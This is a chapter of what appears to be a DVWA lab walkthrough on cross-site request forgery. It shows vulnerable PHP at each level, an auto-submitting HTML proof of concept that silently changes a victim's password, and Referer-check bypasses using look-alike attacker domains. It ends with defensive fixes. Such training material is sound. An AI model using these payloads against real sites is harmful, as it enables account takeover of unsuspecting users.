# Chapter 03 — CSRF (DVWA Module: CSRF)

## Objective
Force an authenticated victim's browser to submit a state-changing request (password change) without their consent, using Burp to craft the malicious HTML PoC.

## Prerequisites
- Target: `http://localhost/dvwa/vulnerabilities/csrf/`
- Burp **Engagement Tools → Generate CSRF PoC** feature

---

## 🟢 LOW

### Source logic
```php
if( isset( $_GET[ 'Change' ] ) ) {
    $pass_new = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];
    if( $pass_new == $pass_conf ) {
        $pass_new = ((md5($pass_new)));
        $query = "UPDATE users SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        // no token check, GET-based
    }
}
```
State-changing action performed via `GET`, no CSRF token, relies solely on the victim's active session cookie.

### Burp Suite steps
1. Capture the password-change request in Proxy: 
   `GET /dvwa/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change#`
2. Right-click the request → **Engagement tools → Generate CSRF PoC**.
3. Burp auto-generates an HTML form/auto-submit page. Save it as `csrf_poc.html`.
4. Host it (e.g., `python3 -m http.server 8000`) and, while still logged into DVWA in the *same browser*, open `csrf_poc.html`.
5. The victim's password silently changes to `hacked123` — confirm by logging out and back in with the new password.

### Manual PoC (what Burp generates)
```html
<html><body>
<form action="http://localhost/dvwa/vulnerabilities/csrf/" method="GET">
  <input type="hidden" name="password_new" value="hacked123">
  <input type="hidden" name="password_conf" value="hacked123">
  <input type="hidden" name="Change" value="Change">
</form>
<script>document.forms[0].submit();</script>
</body></html>
```

### Why it works
Browsers automatically attach cookies to cross-site requests. Without a CSRF token or `SameSite` cookie protection, the server can't distinguish a legitimate user-initiated request from one forged by another site.

---

## 🟡 MEDIUM

### Source logic
```php
if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME 
' ]) !== false ) {
    // proceed only if Referer header contains the server's hostname
}
```
Checks the `Referer` header contains the DVWA hostname somewhere in the string.

### Burp Suite bypass
1. Host your PoC page at a domain/path that **contains** the target hostname as a substring, e.g.:
   `http://evil.com/localhost/csrf.html` — the Referer would be `http://evil.com/localhost/csrf.html`, which contains the string `localhost`.
2. In Burp Repeater, manually strip or spoof the `Referer` header entirely (some browsers omit Referer for local file:// origins) — test:
   ```
   Referer: http://localhost.evil.com/
   ```
3. Alternatively, some browser/meta-referrer-policy tricks can suppress the Referer header client-side (`<meta name="referrer" content="no-referrer">`), which — depending on server logic for a *missing* header — may also bypass a naive check.

### Why the bypass works
`stripos()` performs a **substring** match, not an exact-origin comparison. Any Referer value that merely *contains* the expected hostname passes, which an attacker fully controls by naming their malicious domain/path accordingly.

---

## 🔴 HIGH

### Source logic
```php
if( preg_match( '/^' . preg_quote( $_SERVER[ 'SERVER_NAME' ], '/' ) . '/', parse_url($_SERVER[ 'HTTP_REFERER' ], PHP_URL_HOST) ) ) {
```
Anchors the Referer host to *start with* the exact server name using `preg_match` on the parsed host.

### Burp Suite exercise
1. Try hosting the PoC on a subdomain that starts with the target's hostname string, e.g. `localhost.attacker.com` if DNS/hosts allow it — `preg_match('/^localhost/')` would match `localhost.attacker.com` too, since it only anchors the **start**, not full equality.
2. This demonstrates the fix is *better* than Medium but still not airtight without a `$` end-anchor or exact `===` comparison.

### Why it's still imperfect
Anchoring only the beginning of the string (no `$` end delimiter) allows an attacker-controlled subdomain prefix trick in edge cases — an important lesson in regex anchoring.

---

## ⚪ IMPOSSIBLE

### Source logic
```php
// Requires a per-session, per-request CSRF token
$user_token = $_SESSION[ 'session_token' ];
checkToken( $_REQUEST[ 'user_token' ], $user_token, 'index.php' );
// Also requires re-entering current password
$pass_curr = md5( $_GET[ 'password_current' ] );
$query = "SELECT password FROM users WHERE user = '" . dvwaCurrentUser() . "' AND password = '$pass_curr';";
```

### Why the attack fails
- A **secret, unpredictable, per-session token** must be included and match server-side — an attacker's cross-site form cannot read or guess it (Same-Origin Policy prevents reading the victim's page contents).
- Requiring the **current password** adds re-authentication (defense in depth) — even a stolen/leaked token alone can't change the password without also knowing the current one.

### Burp Suite exercise
Attempt to replay a captured token from a previous session in the CSRF PoC — it will fail because tokens are single-session/short-lived and tied server-side to `$_SESSION`.

---

## Root Cause Analysis
CSRF exploits the browser's automatic inclusion of credentials (cookies) on cross-origin requests combined with the server's inability to verify request *origin/intent*. Referer-checking is a weak, spoofable substitute for a proper anti-CSRF token bound to the user's session.

## Defensive Takeaways
- Use unpredictable, per-session (or per-request) CSRF tokens validated server-side (`checkToken` pattern).
- Set cookies with `SameSite=Strict` or `Lax` as defense in depth.
- Use `POST` (not `GET`) for state-changing actions — GET should be idempotent per HTTP semantics.
- Require re-authentication (password confirmation) for sensitive actions.
- Don't rely on `Referer`/`Origin` header checks alone; if used, do **exact** comparison, not substring matching.

---
⬅ [Back: Command Injection](02-command-injection.md) | ➡ [Next: File Inclusion](04-file-inclusion.md)
